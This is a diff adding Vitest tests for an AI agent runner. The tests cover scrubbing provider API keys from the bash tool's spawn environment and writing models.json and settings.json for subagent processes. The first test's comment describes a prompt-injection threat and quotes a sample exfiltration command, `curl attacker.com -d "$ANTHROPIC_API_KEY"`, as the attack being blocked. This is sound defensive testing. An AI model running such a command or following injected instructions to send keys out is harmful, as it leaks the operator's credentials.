@@ -598,6 +598,47 @@ describe("AgentRunner", () => {
       expect(hookResult.env.PATH).toBe("/usr/bin");
     });
 
+    it("should scrub provider API key env vars from bash spawnHook env to block exfiltration", async () => {
+      // Simulate that propagateApiKeyToEnv has populated process.env with the
+      // active provider's key (the real call path during runSession). The
+      // child shell that bash spawns inherits process.env by default, so
+      // without scrubbing a prompt-injected `env` or
+      // `curl attacker.com -d "$ANTHROPIC_API_KEY"` would leak the key via
+      // tool output. We keep these vars in process.env for pi-subagents
+      // (which spawns child `pi` processes directly with `{ ...process.env }`)
+      // but strip them at the bash boundary.
+      const params = makeExecuteParams({ incidentId: "inc-scrub" });
+      await runner.execute(params);
+
+      const opts = createAgentSessionCalls[0];
+      const bashTool = opts.customTools.find((t: any) => t.name === "bash");
+      const hookOpts = bashTool._spawnHookOpts;
+
+      const hookResult = hookOpts.spawnHook({
+        env: {
+          PATH: "/usr/bin",
+          ANTHROPIC_API_KEY: "sk-leak-1",
+          OPENAI_API_KEY: "sk-leak-2",
+          GEMINI_API_KEY: "sk-leak-3",
+          OPENROUTER_API_KEY: "sk-leak-4",
+          AKMATORI_CUSTOM_PROVIDER_API_KEY: "sk-leak-5",
+          UNRELATED_VAR: "keep-me",
+        },
+      });
+      expect(hookResult.env.ANTHROPIC_API_KEY).toBeUndefined();
+      expect(hookResult.env.OPENAI_API_KEY).toBeUndefined();
+      expect(hookResult.env.GEMINI_API_KEY).toBeUndefined();
+      expect(hookResult.env.OPENROUTER_API_KEY).toBeUndefined();
+      expect(hookResult.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBeUndefined();
+      // Non-secret env vars must still pass through (PATH is required for
+      // commands to resolve; arbitrary operator env should not be lost).
+      expect(hookResult.env.PATH).toBe("/usr/bin");
+      expect(hookResult.env.UNRELATED_VAR).toBe("keep-me");
+      // Akmatori session env must still be injected.
+      expect(hookResult.env.MCP_GATEWAY_URL).toBeDefined();
+      expect(hookResult.env.INCIDENT_ID).toBe("inc-scrub");
+    });
+
     it("should forward hardcoded provider retry settings to SettingsManager", async () => {
       const { SettingsManager } = await import("@earendil-works/pi-coding-agent");
       await runner.execute(makeExecuteParams());
@@ -623,6 +664,872 @@ describe("AgentRunner", () => {
       const result = await runner.execute(makeExecuteParams());
 
       expect(result.response).toBe("Fallback response");
+    });
+
+    // -------------------------------------------------------------------
+    // Subagent child-process config materialization
+    //
+    // Subagent invocations spawn child `pi` processes that read both
+    // models.json (for the custom-provider model spec) and settings.json
+    // (for the default provider+model) from `<agentDir>`. The parent's
+    // in-memory state is invisible to the child; we must persist these
+    // config files so the child resolves the same provider/model the
+    // parent uses, instead of falling back to pi's catalogue default or
+    // picking a different available provider.
+    // -------------------------------------------------------------------
+    describe("subagent child-process config materialization", () => {
+      let tmpAgentDir: string;
+      let tmpWorkDir: string;
+      const fs = require("node:fs") as typeof import("node:fs");
+      const path = require("node:path") as typeof import("node:path");
+      const os = require("node:os") as typeof import("node:os");
+
+      beforeEach(async () => {
+        tmpAgentDir = fs.mkdtempSync(path.join(os.tmpdir(), "akmatori-agent-runner-test-"));
+        tmpWorkDir = fs.mkdtempSync(path.join(os.tmpdir(), "akmatori-workdir-test-"));
+        const { getAgentDir } = await import("@earendil-works/pi-coding-agent");
+        (getAgentDir as unknown as ReturnType<typeof vi.fn>).mockReturnValue(tmpAgentDir);
+      });
+
+      afterEach(() => {
+        try {
+          fs.rmSync(tmpAgentDir, { recursive: true, force: true });
+        } catch {
+          /* best-effort cleanup */
+        }
+        try {
+          fs.rmSync(tmpWorkDir, { recursive: true, force: true });
+        } catch {
+          /* best-effort cleanup */
+        }
+        // Don't leak the custom-provider API key env var into sibling tests.
+        delete process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY;
+      });
+
+
+      // ---- models.json (custom provider materialization) ----
+
+      it("writes akmatori-custom provider in models.json so subagent child processes can resolve the model", async () => {
+        const params = makeExecuteParams({
+          llmSettings: makeLLMSettings({
+            provider: "custom",
+            api_key: "sk-custom-key-123",
+            model: "custom-model-id",
+            base_url: "https://gateway.internal.example/v1",
+          }),
+        });
+        await runner.execute(params);
+
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        expect(fs.existsSync(modelsPath)).toBe(true);
+
+        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
+          providers: {
+            "akmatori-custom": {
+              baseUrl: string;
+              api: string;
+              apiKey: string;
+              models: Array<{ id: string }>;
+              _akmatoriManaged?: boolean;
+            };
+            custom?: unknown;
+          };
+        };
+        // Akmatori uses a dedicated provider key (not `custom`) so an operator
+        // who places their own `providers.custom` entry cannot collide with us.
+        expect(config.providers["akmatori-custom"].baseUrl).toBe("https://gateway.internal.example/v1");
+        expect(config.providers["akmatori-custom"].api).toBe("openai-completions");
+        // apiKey is the env var NAME, not the literal secret — pi-mono's
+        // resolveConfigValueOrThrow reads process.env[name] when resolving
+        // so we don't persist the raw key under /home/agent/.pi.
+        expect(config.providers["akmatori-custom"].apiKey).toBe("AKMATORI_CUSTOM_PROVIDER_API_KEY");
+        expect(process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBe("sk-custom-key-123");
+        expect(config.providers["akmatori-custom"].models[0].id).toBe("custom-model-id");
+        // Marker lets future runs distinguish akmatori-managed entries from
+        // operator-maintained ones.
+        expect(config.providers["akmatori-custom"]._akmatoriManaged).toBe(true);
+        // No collision with operator's `custom` slot.
+        expect(config.providers.custom).toBeUndefined();
+      });
+
+      it("writes akmatori-custom in models.json even when operator has an unmarked providers.custom", async () => {
+        // Regression: previously, an operator-supplied `providers.custom` caused us
+        // to bail without writing models.json. settings.json still pointed at
+        // `defaultProvider: "custom"`, so the child resolved through the operator's
+        // mismatched entry. Now we always write under the dedicated slot.
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        fs.writeFileSync(
+          modelsPath,
+          JSON.stringify({
+            providers: {
+              custom: {
+                baseUrl: "https://operator.example/v1",
+                api: "openai-completions",
+                apiKey: "operator-key",
+                models: [{ id: "operator-model" }],
+              },
+            },
+          }),
+        );
+
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "custom",
+              api_key: "akmatori-key",
+              model: "akmatori-model",
+              base_url: "https://akmatori.example/v1",
+            }),
+          }),
+        );
+
+        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
+          providers: {
+            custom: { baseUrl: string; apiKey: string };
+            "akmatori-custom": { baseUrl: string; apiKey: string; models: Array<{ id: string }> };
+          };
+        };
+        // Operator's `custom` entry is untouched.
+        expect(config.providers.custom.baseUrl).toBe("https://operator.example/v1");
+        expect(config.providers.custom.apiKey).toBe("operator-key");
+        // Akmatori writes its own slot side-by-side with the operator's; the
+        // apiKey field references our env var, not the literal secret.
+        expect(config.providers["akmatori-custom"].baseUrl).toBe("https://akmatori.example/v1");
+        expect(config.providers["akmatori-custom"].apiKey).toBe("AKMATORI_CUSTOM_PROVIDER_API_KEY");
+        expect(process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBe("akmatori-key");
+        expect(config.providers["akmatori-custom"].models[0].id).toBe("akmatori-model");
+      });
+
+      it("does not write models.json for built-in providers", async () => {
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant-key",
+              model: "claude-sonnet-4-5-20250929",
+            }),
+          }),
+        );
+
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        expect(fs.existsSync(modelsPath)).toBe(false);
+      });
+
+      // Regression: an operator typing a model id that isn't in pi-mono's
+      // built-in catalogue (e.g. a freshly released Claude version, a custom
+      // OpenRouter route) used to leave subagent children without a way to
+      // resolve it. The child's `findInitialModel` saved-default path calls
+      // `modelRegistry.find(provider, model)`, which only matches built-ins
+      // and entries from models.json. We must materialize an entry under
+      // `providers.<provider>.models[]` so the find() call succeeds and the
+      // subagent runs on the UI-selected model instead of pi's hardcoded
+      // `defaultModelPerProvider` fallback.
+      it("materializes an unknown built-in-provider model into providers.<provider>.models[]", async () => {
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant-key",
+              // Not present in the getModel mock — simulates a newly released
+              // model that hasn't been added to pi-ai's catalogue yet.
+              model: "claude-99-future-preview",
+            }),
+          }),
+        );
+
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        expect(fs.existsSync(modelsPath)).toBe(true);
+
+        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
+          providers: Record<string, { models?: Array<Record<string, unknown>> }>;
+        };
+        const anthropic = config.providers.anthropic;
+        expect(anthropic).toBeDefined();
+        expect(Array.isArray(anthropic.models)).toBe(true);
+        const ourModel = anthropic.models!.find((m) => m.id === "claude-99-future-preview");
+        expect(ourModel).toBeDefined();
+        expect(ourModel?.name).toBe("claude-99-future-preview");
+        // Marker-bearing so the next sync can identify and replace this entry.
+        expect(ourModel?._akmatoriManaged).toBe(true);
+        // No `akmatori-custom` slot since provider is built-in.
+        expect("akmatori-custom" in config.providers).toBe(false);
+      });
+
+      it("appends the managed model alongside operator-supplied models without removing them", async () => {
+        // Operator may have added their own custom models under
+        // providers.openai (e.g. an on-prem proxy). Our materialization must
+        // append next to them, not clobber them.
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        fs.writeFileSync(
+          modelsPath,
+          JSON.stringify({
+            providers: {
+              openai: {
+                apiKey: "operator-key",
+                models: [{ id: "operator-onprem-model", contextWindow: 65536 }],
+              },
+            },
+          }),
+        );
+
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "openai",
+              api_key: "sk-openai-key",
+              model: "gpt-99-future-preview",
+            }),
+          }),
+        );
+
+        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
+          providers: { openai: { apiKey?: string; models?: Array<Record<string, unknown>> } };
+        };
+        // Operator config preserved.
+        expect(config.providers.openai.apiKey).toBe("operator-key");
+        const ids = (config.providers.openai.models ?? []).map((m) => m.id);
+        expect(ids).toContain("operator-onprem-model");
+        expect(ids).toContain("gpt-99-future-preview");
+        // The akmatori-managed model is the one with the marker.
+        const managed = (config.providers.openai.models ?? []).find(
+          (m) => m._akmatoriManaged === true,
+        );
+        expect(managed?.id).toBe("gpt-99-future-preview");
+      });
+
+      it("clears stale akmatori-managed models from prior built-in providers when the active provider changes", async () => {
+        // Seed a stale managed entry under providers.openai from a previous
+        // session that had openai/gpt-99-old selected.
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        fs.writeFileSync(
+          modelsPath,
+          JSON.stringify({
+            providers: {
+              openai: {
+                apiKey: "operator-key",
+                models: [
+                  { id: "operator-onprem-model" },
+                  {
+                    id: "gpt-99-old",
+                    name: "gpt-99-old",
+                    reasoning: true,
+                    _akmatoriManaged: true,
+                  },
+                ],
+              },
+            },
+          }),
+        );
+
+        // Switch to anthropic with another unknown-to-registry model id.
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant",
+              model: "claude-99-future-preview",
+            }),
+          }),
+        );
+
+        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
+          providers: {
+            openai: { apiKey?: string; models?: Array<Record<string, unknown>> };
+            anthropic: { models?: Array<Record<string, unknown>> };
+          };
+        };
+        // Stale managed entry gone; operator-supplied entry retained.
+        const openaiIds = (config.providers.openai.models ?? []).map((m) => m.id);
+        expect(openaiIds).not.toContain("gpt-99-old");
+        expect(openaiIds).toContain("operator-onprem-model");
+        expect(config.providers.openai.apiKey).toBe("operator-key");
+        // New managed entry placed under the active provider.
+        const anthropicIds = (config.providers.anthropic.models ?? []).map((m) => m.id);
+        expect(anthropicIds).toContain("claude-99-future-preview");
+      });
+
+      it("does not re-write models.json on second sync when the managed entry is already present", async () => {
+        // Idempotency guard: the before === after short-circuit should
+        // recognize that the second call produces the same provider map and
+        // skip the atomic write. Otherwise mtime drift would surface as
+        // spurious config-drift signals to operators.
+        const params = makeExecuteParams({
+          llmSettings: makeLLMSettings({
+            provider: "anthropic",
+            api_key: "sk-ant",
+            model: "claude-99-future-preview",
+          }),
+        });
+        await runner.execute(params);
+
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        const firstMtime = fs.statSync(modelsPath).mtimeMs;
+
+        // Wait a tick so mtime resolution can distinguish a re-write.
+        await new Promise((resolve) => setTimeout(resolve, 50));
+
+        await runner.execute(params);
+        const secondMtime = fs.statSync(modelsPath).mtimeMs;
+        expect(secondMtime).toBe(firstMtime);
+      });
+
+      it("clears its own stale akmatori-custom entry when provider switches to a built-in", async () => {
+        // Seed an existing models.json carrying an akmatori-managed stale
+        // akmatori-custom config (marker present).
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        fs.writeFileSync(
+          modelsPath,
+          JSON.stringify({
+            providers: {
+              "akmatori-custom": {
+                baseUrl: "https://old.example/v1",
+                api: "openai-completions",
+                apiKey: "sk-old",
+                models: [{ id: "old-model" }],
+                _akmatoriManaged: true,
+              },
+              anthropic: { apiKey: "ignored" },
+            },
+          }),
+        );
+
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant-new",
+              model: "claude-sonnet-4-5-20250929",
+            }),
+          }),
+        );
+
+        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as { providers: Record<string, unknown> };
+        expect("akmatori-custom" in config.providers).toBe(false);
+        expect("anthropic" in config.providers).toBe(true);
+      });
+
+      it("migrates legacy marker-bearing providers.custom entries by removing them", async () => {
+        // Older versions wrote akmatori's custom config under `providers.custom`
+        // with the marker. After the move to a dedicated key, those legacy
+        // entries should be cleaned up so they cannot mislead an operator
+        // inspecting models.json.
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        fs.writeFileSync(
+          modelsPath,
+          JSON.stringify({
+            providers: {
+              custom: {
+                baseUrl: "https://legacy.example/v1",
+                api: "openai-completions",
+                apiKey: "sk-legacy",
+                models: [{ id: "legacy-model" }],
+                _akmatoriManaged: true,
+              },
+            },
+          }),
+        );
+
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "custom",
+              api_key: "akmatori-key",
+              model: "akmatori-model",
+              base_url: "https://akmatori.example/v1",
+            }),
+          }),
+        );
+
+        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
+          providers: Record<string, { baseUrl?: string; apiKey?: string; models?: Array<{ id: string }> }>;
+        };
+        // Legacy marker-bearing custom entry is gone.
+        expect("custom" in config.providers).toBe(false);
+        // New akmatori-custom entry carries the current config; apiKey is the
+        // env var name and the live secret is propagated via process.env.
+        expect(config.providers["akmatori-custom"]?.baseUrl).toBe("https://akmatori.example/v1");
+        expect(config.providers["akmatori-custom"]?.apiKey).toBe("AKMATORI_CUSTOM_PROVIDER_API_KEY");
+        expect(process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBe("akmatori-key");
+      });
+
+      it("does not delete an operator-managed custom entry when provider switches to a built-in", async () => {
+        // Seed an operator-maintained custom entry (no _akmatoriManaged marker).
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        fs.writeFileSync(
+          modelsPath,
+          JSON.stringify({
+            providers: {
+              custom: {
+                baseUrl: "https://operator.example/v1",
+                api: "openai-completions",
+                apiKey: "operator-key",
+                models: [{ id: "operator-model" }],
+              },
+            },
+          }),
+        );
+
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant-new",
+              model: "claude-sonnet-4-5-20250929",
+            }),
+          }),
+        );
+
+        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
+          providers: { custom?: { baseUrl?: string; apiKey?: string } };
+        };
+        expect(config.providers.custom).toBeDefined();
+        expect(config.providers.custom?.baseUrl).toBe("https://operator.example/v1");
+        expect(config.providers.custom?.apiKey).toBe("operator-key");
+      });
+
+      it("does not overwrite an operator-managed akmatori-custom slot when the active provider is custom", async () => {
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        fs.writeFileSync(
+          modelsPath,
+          JSON.stringify({
+            providers: {
+              "akmatori-custom": {
+                baseUrl: "https://operator.example/v1",
+                api: "openai-completions",
+                apiKey: "operator-key",
+                models: [{ id: "operator-model" }],
+              },
+            },
+          }),
+        );
+
+        const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+        try {
+          await runner.execute(
+            makeExecuteParams({
+              llmSettings: makeLLMSettings({
+                provider: "custom",
+                api_key: "akmatori-key",
+                model: "akmatori-model",
+                base_url: "https://akmatori.example/v1",
+              }),
+            }),
+          );
+
+          const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
+            providers: { "akmatori-custom": { baseUrl: string; apiKey: string } };
+          };
+          expect(config.providers["akmatori-custom"].baseUrl).toBe("https://operator.example/v1");
+          expect(config.providers["akmatori-custom"].apiKey).toBe("operator-key");
+          expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("operator-managed providers.akmatori-custom"));
+        } finally {
+          warnSpy.mockRestore();
+        }
+      });
+
+      it("preserves a JSONC models.json (comments and trailing commas) when active provider is non-custom", async () => {
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        const jsoncContent = `{
+  // Operator-maintained config with comments
+  "providers": {
+    "custom": {
+      "baseUrl": "https://operator.example/v1",
+      "apiKey": "operator-key", // inline comment
+      "models": [{ "id": "operator-model" }],
+    },
+  },
+}
+`;
+        fs.writeFileSync(modelsPath, jsoncContent);
+
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant",
+              model: "claude-sonnet-4-5-20250929",
+            }),
+          }),
+        );
+
+        // Operator's JSONC file was understood (not unparseable) and the
+        // operator-owned custom entry was kept.
+        const written = fs.readFileSync(modelsPath, "utf-8");
+        // The non-custom code path treats operator entries as read-only and
+        // returns early without writing, so the file content is byte-identical.
+        expect(written).toBe(jsoncContent);
+      });
+
+      it("leaves an unparseable models.json untouched and warns", async () => {
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        const garbage = "{ this is not valid json or jsonc !!! ";
+        fs.writeFileSync(modelsPath, garbage);
+
+        const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+        try {
+          await runner.execute(
+            makeExecuteParams({
+              llmSettings: makeLLMSettings({
+                provider: "custom",
+                api_key: "akmatori-key",
+                model: "akmatori-model",
+                base_url: "https://akmatori.example/v1",
+              }),
+            }),
+          );
+
+          // File is preserved byte-for-byte rather than overwritten.
+          expect(fs.readFileSync(modelsPath, "utf-8")).toBe(garbage);
+          expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("failed to parse"));
+        } finally {
+          warnSpy.mockRestore();
+        }
+      });
+
+      it("skips write when custom provider has no base_url and warns instead", async () => {
+        const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+        try {
+          await runner.execute(
+            makeExecuteParams({
+              llmSettings: makeLLMSettings({
+                provider: "custom",
+                api_key: "sk-no-baseurl",
+                model: "ghost-model",
+                base_url: undefined,
+              }),
+            }),
+          );
+
+          const modelsPath = path.join(tmpAgentDir, "models.json");
+          expect(fs.existsSync(modelsPath)).toBe(false);
+          expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("custom provider missing base_url"));
+        } finally {
+          warnSpy.mockRestore();
+        }
+      });
+
+      // ---- settings.json (subagent default provider+model) ----
+
+      it("writes settings.json defaultProvider/defaultModel so subagents inherit the parent's model", async () => {
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant",
+              model: "claude-sonnet-4-5-20250929",
+            }),
+          }),
+        );
+
+        const settingsPath = path.join(tmpAgentDir, "settings.json");
+        expect(fs.existsSync(settingsPath)).toBe(true);
+        const settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8")) as {
+          defaultProvider: string;
+          defaultModel: string;
+        };
+        expect(settings.defaultProvider).toBe("anthropic");
+        expect(settings.defaultModel).toBe("claude-sonnet-4-5-20250929");
+      });
+
+      it("routes settings.json defaults at the akmatori-custom slot when the active provider is custom", async () => {
+        // The on-disk slot name decouples akmatori from the operator-owned
+        // `providers.custom` so the child resolves the UI-selected model
+        // through our managed entry, not whatever the operator put there.
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "custom",
+              api_key: "akmatori-key",
+              model: "akmatori-model",
+              base_url: "https://akmatori.example/v1",
+            }),
+          }),
+        );
+
+        const settings = JSON.parse(
+          fs.readFileSync(path.join(tmpAgentDir, "settings.json"), "utf-8"),
+        ) as { defaultProvider: string; defaultModel: string };
+        expect(settings.defaultProvider).toBe("akmatori-custom");
+        expect(settings.defaultModel).toBe("akmatori-model");
+      });
+
+      it("clears enabledModels in settings.json so the saved default is not overridden by operator scope", async () => {
+        // Regression: pi's CLI applies `enabledModels` before falling back to
+        // saved defaults (main.ts#buildSessionOptions), so an operator-set
+        // `enabledModels: ["openai/*"]` would override our defaultProvider:
+        // "anthropic" and pick the first OpenAI model in scope. We clear the
+        // key so subagent subprocesses always run on the UI-selected model.
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const settingsPath = path.join(tmpAgentDir, "settings.json");
+        fs.writeFileSync(
+          settingsPath,
+          JSON.stringify({
+            theme: "operator-theme",
+            enabledModels: ["openai/*"],
+          }),
+        );
+
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant",
+              model: "claude-sonnet-4-5-20250929",
+            }),
+          }),
+        );
+
+        const settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8")) as {
+          theme: string;
+          defaultProvider: string;
+          defaultModel: string;
+          enabledModels?: unknown;
+        };
+        expect(settings.theme).toBe("operator-theme");
+        expect(settings.defaultProvider).toBe("anthropic");
+        expect(settings.defaultModel).toBe("claude-sonnet-4-5-20250929");
+        expect("enabledModels" in settings).toBe(false);
+      });
+
+      it("preserves unrelated operator settings when updating defaults", async () => {
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const settingsPath = path.join(tmpAgentDir, "settings.json");
+        fs.writeFileSync(
+          settingsPath,
+          JSON.stringify({
+            theme: "operator-theme",
+            keybindings: { submit: "ctrl+enter" },
+            defaultProvider: "openai",
+            defaultModel: "gpt-old",
+          }),
+        );
+
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant",
+              model: "claude-sonnet-4-5-20250929",
+            }),
+          }),
+        );
+
+        const settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8")) as {
+          theme: string;
+          keybindings: { submit: string };
+          defaultProvider: string;
+          defaultModel: string;
+        };
+        expect(settings.theme).toBe("operator-theme");
+        expect(settings.keybindings.submit).toBe("ctrl+enter");
+        expect(settings.defaultProvider).toBe("anthropic");
+        expect(settings.defaultModel).toBe("claude-sonnet-4-5-20250929");
+      });
+
+      it("parses JSONC settings.json (comments and trailing commas)", async () => {
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const settingsPath = path.join(tmpAgentDir, "settings.json");
+        fs.writeFileSync(
+          settingsPath,
+          `{
+  // Operator-maintained settings with comments
+  "theme": "operator-theme",
+  "defaultProvider": "openai", // outdated
+  "defaultModel": "gpt-old",
+}
+`,
+        );
+
+        await runner.execute(
+          makeExecuteParams({
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant",
+              model: "claude-sonnet-4-5-20250929",
+            }),
+          }),
+        );
+
+        const settings = JSON.parse(fs.readFileSync(settingsPath, "utf-8")) as {
+          theme: string;
+          defaultProvider: string;
+          defaultModel: string;
+        };
+        expect(settings.theme).toBe("operator-theme");
+        expect(settings.defaultProvider).toBe("anthropic");
+        expect(settings.defaultModel).toBe("claude-sonnet-4-5-20250929");
+      });
+
+      it("leaves an unparseable settings.json untouched and warns", async () => {
+        fs.mkdirSync(tmpAgentDir, { recursive: true });
+        const settingsPath = path.join(tmpAgentDir, "settings.json");
+        const garbage = "{{ not valid json or jsonc :: ";
+        fs.writeFileSync(settingsPath, garbage);
+
+        const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+        try {
+          await runner.execute(
+            makeExecuteParams({
+              llmSettings: makeLLMSettings({
+                provider: "anthropic",
+                api_key: "sk-ant",
+                model: "claude-sonnet-4-5-20250929",
+              }),
+            }),
+          );
+
+          expect(fs.readFileSync(settingsPath, "utf-8")).toBe(garbage);
+          expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("failed to parse"));
+        } finally {
+          warnSpy.mockRestore();
+        }
+      });
+
+      it("pins defaultThinkingLevel in settings.json so subagents honor the parent's thinking mode", async () => {
+        // Custom OpenAI-compatible gateways may reject reasoning parameters when
+        // the operator sets thinking to "off". Without this setting the child
+        // would fall back to "medium" and send reasoning_effort, breaking the
+        // child run on those endpoints.
+        await runner.execute(
+          makeExecuteParams({
+            workDir: tmpWorkDir,
+            llmSettings: makeLLMSettings({
+              provider: "custom",
+              api_key: "sk-custom",
+              model: "custom-model",
+              base_url: "https://gateway.example/v1",
+              thinking_level: "off",
+            }),
+          }),
+        );
+
+        const globalSettings = JSON.parse(
+          fs.readFileSync(path.join(tmpAgentDir, "settings.json"), "utf-8"),
+        ) as { defaultThinkingLevel?: string };
+        expect(globalSettings.defaultThinkingLevel).toBe("off");
+
+        const projectSettings = JSON.parse(
+          fs.readFileSync(path.join(tmpWorkDir, ".pi", "settings.json"), "utf-8"),
+        ) as { defaultThinkingLevel?: string };
+        expect(projectSettings.defaultThinkingLevel).toBe("off");
+      });
+
+      it("writes settings.json at workDir/.pi/ so a project-scope file cannot shadow our defaults", async () => {
+        // pi-mono merges global with project settings, project taking precedence
+        // (FileSettingsStorage in pi-mono settings-manager.ts). Writing only the
+        // global file would leave subagents vulnerable to a workspace-local
+        // settings.json — pre-existing, operator-supplied, or written by the
+        // agent itself during the run — silently overriding the parent's model.
+        await runner.execute(
+          makeExecuteParams({
+            workDir: tmpWorkDir,
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant",
+              model: "claude-sonnet-4-5-20250929",
+              thinking_level: "high",
+            }),
+          }),
+        );
+
+        const projectPath = path.join(tmpWorkDir, ".pi", "settings.json");
+        expect(fs.existsSync(projectPath)).toBe(true);
+        const projectSettings = JSON.parse(fs.readFileSync(projectPath, "utf-8")) as {
+          defaultProvider: string;
+          defaultModel: string;
+          defaultThinkingLevel: string;
+        };
+        expect(projectSettings.defaultProvider).toBe("anthropic");
+        expect(projectSettings.defaultModel).toBe("claude-sonnet-4-5-20250929");
+        expect(projectSettings.defaultThinkingLevel).toBe("high");
+      });
+
+      it("project workDir/.pi/settings.json overrides pre-existing project defaults that would shadow the parent", async () => {
+        // Simulate a workspace polluted by either a previous run or an
+        // operator-mounted volume carrying a different defaultProvider/model.
+        const projectDir = path.join(tmpWorkDir, ".pi");
+        fs.mkdirSync(projectDir, { recursive: true });
+        fs.writeFileSync(
+          path.join(projectDir, "settings.json"),
+          JSON.stringify({
+            defaultProvider: "openai",
+            defaultModel: "gpt-old",
+            defaultThinkingLevel: "low",
+            enabledModels: ["openai/*"],
+            theme: "operator-project-theme",
+          }),
+        );
+
+        await runner.execute(
+          makeExecuteParams({
+            workDir: tmpWorkDir,
+            llmSettings: makeLLMSettings({
+              provider: "anthropic",
+              api_key: "sk-ant",
+              model: "claude-sonnet-4-5-20250929",
+              thinking_level: "high",
+            }),
+          }),
+        );
+
+        const projectSettings = JSON.parse(
+          fs.readFileSync(path.join(projectDir, "settings.json"), "utf-8"),
+        ) as {
+          defaultProvider: string;
+          defaultModel: string;
+          defaultThinkingLevel: string;
+          enabledModels?: unknown;
+          theme: string;
+        };
+        // Parent's values win over the polluted project file.
+        expect(projectSettings.defaultProvider).toBe("anthropic");
+        expect(projectSettings.defaultModel).toBe("claude-sonnet-4-5-20250929");
+        expect(projectSettings.defaultThinkingLevel).toBe("high");
+        // enabledModels gets cleared so it cannot scope-restrict the saved default.
+        expect("enabledModels" in projectSettings).toBe(false);
+        // Unrelated operator preferences survive.
+        expect(projectSettings.theme).toBe("operator-project-theme");
+      });
+
+      it("propagates the custom-provider apiKey through process.env, not the persisted models.json file", async () => {
+        // Regression: writing the raw apiKey into models.json (which lives on
+        // the agent's persistent home volume at /home/agent/.pi/agent/models.json)
+        // means the secret is readable by every future agent/tool execution.
+        // We instead write an env var NAME and set the env var so the child
+        // process inherits it without on-disk persistence of the literal.
+        delete process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY;
+        await runner.execute(
+          makeExecuteParams({
+            workDir: tmpWorkDir,
+            llmSettings: makeLLMSettings({
+              provider: "custom",
+              api_key: "sk-secret-custom-key",
+              model: "custom-model",
+              base_url: "https://gateway.example/v1",
+            }),
+          }),
+        );
+
+        const modelsPath = path.join(tmpAgentDir, "models.json");
+        const raw = fs.readFileSync(modelsPath, "utf-8");
+        // Literal key must not appear anywhere in the persisted file.
